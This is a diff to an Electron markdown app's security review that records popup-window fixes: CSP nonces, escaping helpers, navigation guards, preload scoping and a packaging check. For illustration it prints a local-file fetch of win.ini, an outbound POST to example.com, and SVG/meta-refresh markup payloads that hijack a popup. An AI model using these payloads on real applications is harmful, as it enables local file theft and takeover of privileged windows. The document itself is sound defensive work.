@@ -27,9 +27,10 @@ Practically: opening an untrusted markdown file in this application should be tr
 ## Remediation status
 
 Findings are being fixed in the order given under *Remediation order* at the end of this
-document. Everything marked FIXED below is covered by a regression test in
-`test-render-security.js` (`npm run test:security`) that was written **before** the fix and
-observed to fail without it.
+document. Everything marked FIXED below is covered by a regression test — in
+`test-render-security.js` (`npm run test:security`) for the renderer pipeline and
+`test-popup-security.js` (`npm run test:popups`) for the popup windows — that was written
+**before** the fix and observed to fail without it.
 
 | Finding | Status | How |
 |---|---|---|
@@ -39,8 +40,64 @@ observed to fail without it.
 | SEC-04 | **FIXED** | OmniWare DSL and error text escaped before assembly. Mitigated at the pipeline level by sanitize-last; not yet escaped at source in `omniwire/omniware.js`. |
 | SEC-01 | **FIXED** (mitigated, feature retained) | `@@@html` frames are pinned to `sandbox="allow-scripts"` with no `allow-same-origin` — enforced both on emission and by a global DOMPurify `afterSanitizeAttributes` hook, so markdown cannot author an un-sandboxed iframe. The frame therefore has an opaque origin and cannot reach `window.parent`. The feature is kept rather than removed. |
 | SEC-23 | **FIXED** | The `postMessage` resize listener now identifies the sender by matching `event.source` against the managed frames instead of trusting an index from the message body, and coerces/clamps the reported height. No attacker-controlled string reaches a selector. |
+| SEC-05 | **FIXED** | Image popup: `alt` escaped for both the `<title>` and the `alt` attribute; `src` passed through a new `safeImageSrc()` that rejects UNC, protocol-relative, remote `file://` and non-image schemes. The `image-popup-save` IPC handler now verifies the sender is the image popup, caps the payload at 64 MB and requires a strict `data:image/(png\|jpeg);base64,…` URL before writing bytes to disk. |
+| SEC-06 | **FIXED** | OmniWare popup: DSL embedded via `toScriptLiteral()`, which escapes `<`, `>`, U+2028 and U+2029 so `</script` is unrepresentable. |
+| SEC-07 | **FIXED** | Mermaid popup: SVG passes through `stripActiveSvgContent()`, which now decodes numeric character references before stripping so `javascript&#58;` cannot survive the filter. The CSP below is the primary control. |
+| SEC-15 | **FIXED** | Table popup: table data embedded via a new `toJsonLiteral()` (`JSON.stringify` + `\u003c`/`\u003e`/U+2028/U+2029 escaping). `JSON.stringify` alone does not escape `<`, so a cell containing `</script>` terminated the generated script element. |
+| SEC-09 | **FIXED for the four popup windows**; open for the main window | Every generated popup document now carries a per-document nonce CSP: `default-src 'none'; script-src 'nonce-…'; connect-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'`. All inline `on*=` handlers were converted to `addEventListener` to satisfy it. |
+| SEC-11 | **FIXED for the four popup windows**; open for the main window | `registerPopup()` denies `will-navigate`, `will-redirect`, `will-frame-navigate` and `setWindowOpenHandler` on every popup, and `<meta>` is stripped from mermaid SVG. See below — the CSP alone did **not** cover this. |
+| SEC-08 | **FIXED for the four popup windows**; open for the main window | Popups run `nodeIntegration: false, contextIsolation: true` behind `popup-preload.js`, which exposes only fixed channels — and only the single API that popup kind needs, selected by a `--popup-kind=` process argument, so script in one popup cannot drive another's privileged path. |
 | SEC-10 | **FIXED** earlier | Runtime libraries vendored locally; no CDN load. |
 | SEC-16/17/18 | **FIXED** earlier | Dependency upgrades (24 advisories → 0). |
+
+### Why the popup CSP is the primary control, not defence in depth
+
+The popup documents are written to a temp file and loaded over `file://`. That origin is
+*not* inert just because Node integration is off. Measured directly from a popup running
+with `nodeIntegration: false, contextIsolation: true`:
+
+```
+fetch('file:///C:/Windows/win.ini')  ->  ok: true, status 200, 92 bytes
+POST https://example.com             ->  request left the machine (405 response)
+```
+
+So any markup injection that manages to execute script in one of these windows is arbitrary
+local-file read plus exfiltration, with or without Node. The regression suite asserts this
+directly: with the CSP deliberately weakened, all four popups report
+`{"scriptRan":true,"handlerRan":true,"fileRead":"READ:92","exfil":"SENT"}` and sixteen
+assertions fail. With the nonce CSP in place, injected `<script>`, injected inline handlers,
+the local read and the outbound request are all refused, while the popup's own
+nonce-carrying script still runs — that last check is what stops the CSP tests from passing
+vacuously against a blank window.
+
+### What the CSP does *not* cover: navigation
+
+A CSP governs what a document may execute, load and connect to. It says nothing about that
+document being **replaced**. Chromium never implemented the `navigate-to` directive, so a
+markup-only payload can still relocate the window:
+
+```
+<svg …></svg><meta http-equiv="refresh" content="0;url=https://example.com/">
+<svg …><foreignObject><meta http-equiv="refresh" content="0;url=https://example.com/"></foreignObject></svg>
+```
+
+Both were confirmed to navigate the mermaid popup to the attacker's URL. This is worse than
+it first appears, and the reason it is treated as a real finding rather than a nuisance: **a
+preload survives a navigation**, so the attacker-controlled remote page inherits
+`popupBridge` — including, on the image popup, its write-to-disk method — and is then a
+normal `https:` origin with none of the temp document's CSP.
+
+The fix is in the main process, because no CSP directive can express it: `registerPopup()`
+denies `will-navigate`, `will-redirect` and `will-frame-navigate`, and returns
+`{ action: "deny" }` from `setWindowOpenHandler`. `stripActiveSvgContent()` additionally
+removes `<meta>` so the element never reaches the document. Both layers are covered
+independently — with the guards disabled, the script-driven cases fail; with the `<meta>`
+strip *also* disabled, both markup cases fail with the popup sitting on `example.com`.
+
+Two feature assertions guard against over-blocking: the table popup's CSV and JSON exports
+build a Blob and click an `<a download>`, which is exactly the kind of thing a
+`default-src 'none'` policy plus navigation guards can kill silently. Both are asserted to
+still start a real download.
 
 Two hardening changes were made beyond the original findings, both regression-tested:
 
@@ -54,6 +111,14 @@ Two hardening changes were made beyond the original findings, both regression-te
 - **Raw-HTML frame ownership.** `@@@html` documents are attached after sanitization, keyed by
   a content hash with a per-key occurrence budget, so a frame can only ever receive a block
   from the current render and a marker authored directly in markdown receives nothing.
+- **Packaging integrity.** `popup-preload.js` is a security control that only works if it is
+  actually shipped, and `package.json` `build.files` is an allowlist, so omitting it would
+  have silently disabled the preload in packaged builds while every test still passed in the
+  dev tree. `test-packaging.js` (`npm run test:packaging`) now walks the real runtime
+  references — preload paths in `main.js`, `<script>`/`<link>` in `index.html`, `@font-face`
+  `url()` in `styles.css` — and asserts each is covered by the allowlist. It self-tests its
+  own glob matcher so it cannot pass vacuously. It immediately caught a second, unrelated
+  omission: the vendored Fira Code fonts.
 
 ---
 
